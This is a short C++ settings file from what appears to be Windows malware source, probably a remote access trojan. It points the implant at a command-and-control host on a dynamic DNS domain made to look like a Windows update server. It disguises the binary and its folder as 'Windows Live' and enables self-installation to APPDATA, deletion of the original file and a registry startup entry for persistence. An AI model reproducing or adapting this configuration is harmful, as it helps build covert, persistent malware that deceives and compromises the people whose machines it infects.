#include "settings.h"

std::string Settings::serverIP = "windistupdate.ddns.net";		//server ip
int Settings::serverPort = 47128;

std::string Settings::fileName = "winlive.exe";					//file name
std::string Settings::folderName = "Windows Live";					//name of folder where file is located
std::string Settings::startupName = "Windows Live";		//startup name in registry / taskmgr
std::string Settings::logFileName = "log.txt";								//name of log file
std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
bool Settings::installSelf = true;				//specifies whether the program should install itself
bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
bool Settings::meltSelf = true;				//specifies whether the installed clone should delete the initial file
bool Settings::setStartupSelf = true;			//specifies whether the program is to be started on system boot
bool Settings::logEvents = true;